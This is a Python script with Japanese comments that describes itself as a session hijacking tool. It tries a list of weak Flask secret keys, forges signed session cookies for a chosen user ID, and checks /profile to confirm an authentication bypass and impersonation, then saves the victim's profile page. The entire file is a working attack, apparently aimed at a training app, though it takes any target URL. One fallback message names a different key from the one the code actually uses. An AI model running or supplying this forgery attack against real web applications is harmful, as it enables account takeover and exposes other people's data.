import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import json
import re
import argparse
import sys
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# コマンドライン引数の解析
parser = argparse.ArgumentParser(
    description='WEBサーバーに対するセッションハイジャックツール',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py --url http://example.com:8080
  python 001session_hijack.py -u http://localhost:5000 --user-id 2
        """
)

parser.add_argument('-u', '--url', 
                   required=True,
                   help='ターゲットURL（必須）')
parser.add_argument('--user-id',
                   default='1',
                   help='攻撃対象のユーザーID（デフォルト: 1）')

args = parser.parse_args()

target_url = args.url.rstrip('/')
target_user_id = args.user_id


SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]

# 3. 偽造するセッションデータ
fake_session = {
    "_user_id": target_user_id,
    "_fresh": True,
    "_id": target_user_id
}

# 4. 複数のSECRET_KEYを試す
print("="*80)
print("SECRET_KEYの特定とセッションハイジャック")
print("="*80)
print(f"\n[*] ターゲットURL: {target_url}")
print(f"[*] 攻撃対象のユーザーID: {target_user_id}")
print(f"\n[*] 試行するSECRET_KEY候補:")
for i, key in enumerate(SECRET_KEYS, 1):
    print(f"  {i}. {key}")

session = None
fake_cookie = None
used_secret_key = None

for secret_key in SECRET_KEYS:
    print(f"\n[*] SECRET_KEYを試行: {secret_key}")
    
    # Flaskアプリケーションを作成してセッションシリアライザーを取得
    # FlaskのSecureCookieSessionInterface.get_signing_serializer()を使用
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    session_interface = app.session_interface
    serializer = session_interface.get_signing_serializer(app)
    
    # セッションクッキーを生成
    test_cookie = serializer.dumps(fake_session)
    
    # テスト用のセッションを作成
    test_session = requests.Session()
    test_session.cookies.set('session', test_cookie)
    
    # プロフィールページにアクセスしてテスト
    test_response = test_session.get(f'{target_url}/profile', allow_redirects=False)
    
    # 成功の判定: 200でプロフィールページが返される、または302でログインページ以外にリダイレクト
    is_success = False
    if test_response.status_code == 200:
        # ログインページが返されていないか確認
        if 'ログイン' not in test_response.text or ('プロフィール' in test_response.text and 'ユーザー名' in test_response.text):
            is_success = True
    elif test_response.status_code == 302:
        redirect_location = test_response.headers.get('Location', '')
        if '/login' not in redirect_location:
            is_success = True
    
    if is_success:
        print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
        session = test_session
        fake_cookie = test_cookie
        used_secret_key = secret_key
        break
    else:
        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗 (ステータス: {test_response.status_code})")

if not session:
    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
    print(f"[!] デフォルトのSECRET_KEY 'your-secret-key-change-in-production' を使用します")
    # デフォルトのSECRET_KEYを使用
    app = Flask(__name__)
    app.config['SECRET_KEY'] = SECRET_KEYS[0]
    session_interface = app.session_interface
    serializer = session_interface.get_signing_serializer(app)
    fake_cookie = serializer.dumps(fake_session)
    session = requests.Session()
    session.cookies.set('session', fake_cookie)
    used_secret_key = SECRET_KEYS[0]

print(f"\n[*] 使用したSECRET_KEY: {used_secret_key}")
print(f"[*] 偽造したセッションクッキー: {fake_cookie[:60]}...")

# デバッグ: セッションクッキーを検証
app = Flask(__name__)
app.config['SECRET_KEY'] = used_secret_key
session_interface = app.session_interface
serializer = session_interface.get_signing_serializer(app)
try:
    decoded_session = serializer.loads(fake_cookie)
    print(f"[*] セッションクッキーの検証: 成功")
    print(f"[*] デコードされたセッションデータ: {decoded_session}")
except Exception as e:
    print(f"[!] セッションクッキーの検証: 失敗 - {e}")

# 6. 保護されたエンドポイントにアクセス
print("\n[*] プロフィールページにアクセス...")
response = session.get(f'{target_url}/profile', allow_redirects=False)
print(f"ステータスコード: {response.status_code}")

# リダイレクトの確認
if response.status_code == 302:
    redirect_location = response.headers.get('Location', '')
    print(f"[*] リダイレクト先: {redirect_location}")
    if '/login' in redirect_location:
        print("[!] ログインページにリダイレクトされました（セッションが無効）")
        if redirect_location.startswith('http'):
            response = session.get(redirect_location, allow_redirects=True)
        else:
            response = session.get(f'{target_url}{redirect_location}', allow_redirects=True)
        print(f"[*] リダイレクト後のステータスコード: {response.status_code}")

# レスポンスの内容を確認
is_login_page = False
if response.status_code == 200:
    # ログインページが返されているか確認
    if 'ログイン' in response.text and 'username' in response.text.lower() and '<title>ログイン' in response.text:
        is_login_page = True
        print("[!] 警告: ログインページが返されました（セッションが無効）")
    elif "プロフィール" in response.text and "ユーザー名" in response.text:
        print("[+] 攻撃成功: 認証をバイパスしました")
        print("[+] ユーザーになりすましてアクセスできました")
        
        # HTML情報をtxtファイルに出力
        output_filename = "profile_page.html"
        try:
            with open(output_filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"[*] HTML情報を {output_filename} に出力しました")
        except Exception as e:
            print(f"[!] HTML情報の出力エラー: {e}")
    else:
        print("[!] ステータス200ですが、プロフィールページかどうか不明です")
else:
    print("[*] 攻撃失敗: 認証が必要です")
